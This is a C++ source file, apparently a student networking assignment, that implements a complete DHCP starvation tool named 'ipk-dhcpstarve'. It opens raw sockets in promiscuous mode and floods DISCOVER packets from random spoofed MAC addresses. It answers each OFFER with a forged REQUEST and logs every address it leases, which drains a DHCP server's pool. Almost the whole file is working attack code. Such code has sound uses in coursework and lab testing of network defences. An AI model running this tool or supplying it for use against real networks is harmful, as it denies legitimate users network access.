#include <iostream>
#include <string.h>
#include <arpa/inet.h>
#include <random>
#include <csignal>

#include <linux/if_packet.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <unistd.h>


#define DEFAULT_IF	"tap0"

#define IPHEAD 14
#define UDPHEAD IPHEAD+20
#define DHCPHEAD UDPHEAD+8
#define DHCPOPT DHCPHEAD+240
using namespace std;
/*Hynek Bernard
 * xberna16@stud.fit.vutbr.cz
 * */
void signalHandler(int sig)
{
    exit(0);
}
enum packetType {Discover,Offer,Request,notSet,ACK};
random_device rd;
mt19937 mt(rd());
uniform_int_distribution<int> dist(0,255);
/*Kód pro výpočet checksum, funkce byla přejata ze stránky
 * http://www.microhowto.info/howto/calculate_an_internet_protocol_checksum_in_c.html
 * úryvek z licence: Copying and distribution of this software, with or without modification, is permitted in any medium without royalty. */
uint16_t ip_checksum(void* vdata,size_t length) {
    // Cast the data pointer to one that can be indexed.
    char* data=(char*)vdata;

    // Initialise the accumulator.
    uint64_t acc=0xffff;

    // Handle any partial block at the start of the data.
    unsigned int offset=((uintptr_t)data)&3;
    if (offset) {
        size_t count=4-offset;
        if (count>length) count=length;
        uint32_t word=0;
        memcpy(offset+(char*)&word,data,count);
        acc+=ntohl(word);
        data+=count;
        length-=count;
    }

    // Handle any complete 32-bit blocks.
    char* data_end=data+(length&~3);
    while (data!=data_end) {
        uint32_t word;
        memcpy(&word,data,4);
        acc+=ntohl(word);
        data+=4;
    }
    length&=3;

    // Handle any partial block at the end of the data.
    if (length) {
        uint32_t word=0;
        memcpy(&word,data,length);
        acc+=ntohl(word);
    }

    // Handle deferred carries.
    acc=(acc&0xffffffff)+(acc>>32);
    while (acc>>16) {
        acc=(acc&0xffff)+(acc>>16);
    }

    // If the data began at an odd byte address
    // then reverse the byte order to compensate.
    if (offset&1) {
        acc=((acc&0xff00)>>8)|((acc&0x00ff)<<8);
    }

    // Return the checksum in network byte order.
    return htons(~acc);
}
class Packet{
    bool wip;
    unsigned char source[6],buff[512];
    //vypočítá checksum a tím je packet validní
    int build()
    {
        //checksum
        uint16_t checksum = ip_checksum(&buff[IPHEAD],20);
        memcpy(&buff[IPHEAD+10],&checksum,sizeof(char)*2);
        wip = false;
        return 0;
    }
    //nastaví hlavičku packetu až po DHCPOPT
    void setHead()
    {
        setBuff(buff,512);
        setBuff(source,6);
        rndMac(source);
        //MAC head
        setBuff(buff,6,0xff);
        memcpy(&buff[6],source,6);
        buff[12]=0x08;
        buff[13]=0x00;

        //IPHEAD verze a délka
        buff[IPHEAD]= 0x45;
        //diff services
        buff[IPHEAD+1]= 0x00;
        //total length
        buff[IPHEAD+2]= 0x01;
        buff[IPHEAD+3]= 0xf2;
        //identifikace packetu
        buff[IPHEAD+4]= dist(mt);
        buff[IPHEAD+5]= dist(mt);
        //flags
        setBuff(&buff[IPHEAD+6],2);
        //TTL
        buff[IPHEAD+8]= 0xff;
        //protocol UDP
        buff[IPHEAD+9]= 0x11;
        //CHECKSUM a source
        setBuff(&buff[IPHEAD+10],6);
        //destination
        setBuff(&buff[IPHEAD+16],4,0xff);

        //UDP source port
        buff[UDPHEAD] = 0x00;
        buff[UDPHEAD+1] = 0x44;
        //destination port
        buff[UDPHEAD+2] = 0x00;
        buff[UDPHEAD+3] = 0x43;
        //length
        buff[UDPHEAD+4] = 0x01;
        buff[UDPHEAD+5] = 0xde;

        //UDP checksum


        //DHCP msgtype
        buff[DHCPHEAD] = 0x01;
        //HW
        buff[DHCPHEAD+1] = 0x01;
        //HWlen
        buff[DHCPHEAD+2] = 0x06;
        //Hops+TID
        setBuff(&buff[DHCPHEAD+3],3);
        buff[DHCPHEAD+6] = dist(mt);
        buff[DHCPHEAD+7] = dist(mt);
        //sec elapsed
        setBuff(&buff[DHCPHEAD+8],2);
        //bootp flags
        buff[DHCPHEAD+10]= 0x80;
        //IP client server relay
        setBuff(&buff[DHCPHEAD+11],17);
        //client MAC
        memcpy(&buff[DHCPHEAD+28],&buff[6], sizeof(char)*6);
        //HW addr padding -> magic cookie
        setBuff(&buff[DHCPHEAD+34],202);
        //magic cookie
        buff[DHCPHEAD+236] = 0x63;
        buff[DHCPHEAD+237] = 0x82;
        buff[DHCPHEAD+238] = 0x53;
        buff[DHCPHEAD+239] = 0x63;
    }
    //Šablona pro vytvoření DISCOVER packetu
public: Packet(){
        this->setHead();
        //DHCP message type Discover
        buff[DHCPOPT] = 0x35;
        buff[DHCPOPT+1] = 0x01;
        buff[DHCPOPT+2] = 0x01;

        //Client ID
        buff[DHCPOPT+3] = 0x3d;
        buff[DHCPOPT+4] = 0x07;
        buff[DHCPOPT+5] = 0x01;
        memcpy(&buff[DHCPOPT+6],&buff[6],sizeof(char)*6);
        //requested IP
        buff[DHCPOPT+12] =0x32;
        buff[DHCPOPT+13] =0x04;
        setBuff(&buff[DHCPOPT+14],4);

        //parameter request list
        buff[DHCPOPT+18] =0x37;
        buff[DHCPOPT+19] =0x04;
        buff[DHCPOPT+20] =0x01;
        buff[DHCPOPT+21] =0x03;
        buff[DHCPOPT+22] =0x06;
        buff[DHCPOPT+23] =0x2a;




        //END
        buff[DHCPOPT+24] = 0xff;
        ofType = Discover;
        wip = true;
    }
    //Šablona pro vytvoření Offer,ACK a Request packetů
    //formát příchozího bufferu pokud recv false -> |MAC 6B|TID 4B|Srv ID 4B|Req IP 4B|
    Packet(unsigned char* buffer,bool recv = false)
    {
        if (recv)
        {
            if (buffer[IPHEAD+9]== 0x11&& buffer[DHCPHEAD] ==0x02 && buffer[DHCPOPT+2]==0x02) {
                ofType = Offer;
                memcpy(buff,buffer,sizeof(char)*512);
            }
            if (buffer[IPHEAD+9]== 0x11&& buffer[DHCPHEAD] ==0x02 && buffer[DHCPOPT+2]==0x05) {
                ofType = ACK;
                memcpy(buff,buffer,sizeof(char)*512);
            }
        }
        else
        {
            ofType = Request;
            wip = true;
            this->setHead();
            memcpy(&buff[6],buffer, sizeof(char)*6);
            memcpy(&buff[DHCPHEAD+4], &buffer[6],sizeof(char) *4);
            memcpy(&buff[DHCPHEAD+28],&buff[6], sizeof(char)*6);

            //DHCP message type Request
            buff[DHCPOPT] = 0x35;
            buff[DHCPOPT+1] = 0x01;
            buff[DHCPOPT+2] = 0x03;

            //Server ID
            buff[DHCPOPT+3]= 0x36;
            buff[DHCPOPT+4]= 0x04;
            memcpy(&buff[DHCPOPT+5],&buffer[10], sizeof(char)*4);

            //requested IP
            buff[DHCPOPT+9] = 0x32;
            buff[DHCPOPT+10] = 0x04;
            memcpy(&buff[DHCPOPT+11],&buffer[14], sizeof(char)*4);

            //hostname
            buff[DHCPOPT+15] = 0x0c;
            buff[DHCPOPT+16] = 0x0a;
            buff[DHCPOPT +17] = (dist(mt) % 89) +33;
            buff[DHCPOPT +18] = (dist(mt) % 89) +33;
            buff[DHCPOPT +19] = (dist(mt) % 89) +33;
            buff[DHCPOPT +20] = (dist(mt) % 89) +33;
            buff[DHCPOPT +21] = (dist(mt) % 89) +33;
            buff[DHCPOPT +22] = (dist(mt) % 89) +33;
            buff[DHCPOPT +23] = (dist(mt) % 89) +33;
            buff[DHCPOPT +24] = (dist(mt) % 89) +33;
            buff[DHCPOPT +25] = (dist(mt) % 89) +33;
            buff[DHCPOPT +26] = (dist(mt) % 89) +33;

            buff[DHCPOPT +28] = 0xff;
        }
    }

    //postaví packet request z přijatého offer packetu
    static Packet *buildNew(Packet *recv)
    {
        unsigned char buildBuff[18];
        memcpy(buildBuff,&recv->buff[DHCPHEAD+28],sizeof(char)*6);
        memcpy(&buildBuff[6],&recv->buff[DHCPHEAD+4],sizeof(char)*4);
        for(int i = DHCPOPT; i<DHCPOPT+100; )
        {
            if(recv->buff[i] != 0x36)
                i+= 2 + recv->buff[i+1];
            else
            {
                memcpy(&buildBuff[10],&recv->buff[i+2],sizeof(char)*4);
                break;
            }
        }
        memcpy(&buildBuff[14],&recv->buff[DHCPHEAD+16],sizeof(char)*4);
        return new Packet(buildBuff);
    }
    //odešle packet
    ssize_t send(int sockfd,sockaddr_ll sAddr)
    {
        if (this->ofType == Offer || this->ofType == ACK)
            return -1;
        if (wip)
            this->build();
        return sendto(sockfd, this->buff, 512, 0, (struct sockaddr*)&sAddr, sizeof(struct sockaddr_ll));
    }
    packetType ofType = notSet;
    //Vypíše informace o zabrání IP adresy
    void printBuffinfo()
    {
        printf("MAC: ");
        for(int i =0; i<6;i++)
        {
            printf("%02X-",buff[DHCPHEAD+28+i]);
        }
        printf("\b");
        printf(" occupies IP: ");
        for(int i =0; i<4;i++)
        {
            printf("%d.",buff[DHCPHEAD+16+i]);
        }
        printf("\b");
        printf(" with TID: 0x");
        for(int i =0; i<4;i++)
        {
            printf("%x",buff[DHCPHEAD+4+i]);
        }
        /*for (int i = 0; i < 618; i++)
            printf("%02x ",buff[i]) ;*/
        cout << endl;
    }
    //Packet(char source[])
    //obdoba funkce memset
    static void setBuff(unsigned char* buff, int len, char c= 0x00) {
        for (int i = 0; i < len; i++)
            buff[i] = c;
    }
    //vytvoří náhodnou reálnou MAC adresu
    static void rndMac(unsigned char mac[]) {
        mac[0]=0x30;
        mac[1]=dist(mt);
        mac[2]=dist(mt);
        mac[3]=dist(mt);
        mac[4]=dist(mt);
        mac[5]=dist(mt);
    }
};
/*Kód pro nalezení interface pro odeslání a přijmutí packetu byl převzat z
 * https://gist.github.com/austinmarton/1922600
 * Kód podlehá volné licenci: This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License
 * */
int main(int argc, char * argv[]) {
    signal(SIGINT, &signalHandler);
    char ifName[IFNAMSIZ];
    int sockfd;
    if (argc == 3 && strcmp(argv[1],"-i") == 0)
        strcpy(ifName, argv[2]);
    else
        {
            printf("USAGE:sudo ./ipk-dhcpstarve -i <interface>");
            exit(1);
        }

    pid_t pid = fork();
    //Přijímání Offer a odesílání Request
    if (pid)
    {
        sockfd = socket(PF_PACKET ,SOCK_RAW , htons(ETH_P_ALL));
        int broad = 1;


        sockaddr_ll sAd;
        struct packet_mreq mreq;
        struct ifreq if_idx2;
        memset(&if_idx2, 0, sizeof(struct ifreq));
        strcpy(if_idx2.ifr_name, ifName);
        if (ioctl(sockfd, SIOCGIFINDEX, &if_idx2) < 0) {
            perror("SIOCGIFINDEX");
            exit(2);
        }
        sAd.sll_family = AF_PACKET;

        sAd.sll_ifindex = if_idx2.ifr_ifindex;
        bind(sockfd,(sockaddr *)&sAd, sizeof(sAd));
        memset(sAd.sll_addr,0xff,8);
        mreq.mr_ifindex = if_idx2.ifr_ifindex;
        mreq.mr_type = PACKET_MR_PROMISC;
        mreq.mr_alen = 6;
        if (setsockopt(sockfd,SOL_PACKET,PACKET_ADD_MEMBERSHIP,
                       (void*)&mreq,(socklen_t)sizeof(mreq)) < 0)
            return -3;

        pid_t pid2 = fork();
        //Přijímání ACK a výpis
        if (pid2)
        {
            for(;;) {

                unsigned char bufferik[342];
                memset(bufferik, 0, sizeof(char) * 342);
                struct sockaddr_ll addr;
                socklen_t addr_len = sizeof(addr);

                recvfrom(sockfd, bufferik, 342, 0,(sockaddr *)&addr,&addr_len);
                Packet *pckt = new Packet(bufferik, true);
                if (pckt->ofType == ACK)
                {
                    pckt->printBuffinfo();
                }
            }
        }
        for(;;) {

            unsigned char bufferik[342];
            memset(bufferik, 0, sizeof(char) * 342);
            struct sockaddr_ll addr;
            socklen_t addr_len = sizeof(addr);

            recvfrom(sockfd, bufferik, 342, 0,(sockaddr *)&addr,&addr_len);
            Packet *pckt = new Packet(bufferik, true);
            if (pckt->ofType == Offer)
            {
                int sockfd2;
                Packet *sendPckt = Packet::buildNew(pckt);
                struct ifreq if_idx;
                struct ifreq if_mac;
                struct sockaddr_ll socket_address;

                if ((sockfd2 = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW)) == -1)
                    printf("Unable to open socket: %d \n", errno);

                /* Get the index of the interface to send on */
                memset(&if_idx, 0, sizeof(struct ifreq));
                strcpy(if_idx.ifr_name, ifName);
                if (ioctl(sockfd2, SIOCGIFINDEX, &if_idx) < 0)
                    perror("SIOCGIFINDEX");
                /* Get the MAC address of the interface to send on */
                memset(&if_mac, 0, sizeof(struct ifreq));
                strcpy(if_mac.ifr_name, ifName);
                if (ioctl(sockfd2, SIOCGIFHWADDR, &if_mac) < 0)
                    perror("SIOCGIFHWADDR");
                /* Index of the network device */
                socket_address.sll_ifindex = if_idx.ifr_ifindex;
                /* Address length*/
                socket_address.sll_halen = ETH_ALEN;

                if (sendPckt->send(sockfd2, socket_address) < 0)
                    printf("Send failed\n");
                close(sockfd2);
            }
        }
    }
    //Spam discover packetů po jedné vteřině
    struct ifreq if_idx;
    struct ifreq if_mac;
    struct sockaddr_ll socket_address;

    if ((sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW)) == -1)
        printf("Unable to open socket: %d \n", errno);

    /* Get the index of the interface to send on */
    memset(&if_idx, 0, sizeof(struct ifreq));
    strcpy(if_idx.ifr_name, ifName);
    if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0){
        perror("SIOCGIFINDEX");
        exit(2);
    }
    /* Get the MAC address of the interface to send on */
    memset(&if_mac, 0, sizeof(struct ifreq));
    strcpy(if_mac.ifr_name, ifName);
    if (ioctl(sockfd, SIOCGIFHWADDR, &if_mac) < 0)
        perror("SIOCGIFHWADDR");
    /* Index of the network device */
    socket_address.sll_ifindex = if_idx.ifr_ifindex;
    /* Address length*/
    socket_address.sll_halen = ETH_ALEN;
    for (int i = 0; i< 255*255; i++) {
        Packet *pckt = new Packet();

        if (pckt->send(sockfd, socket_address) < 0)
            printf("Send failed\n");
        delete pckt;
        sleep(1);
    }
    close(sockfd);
    return 0;
}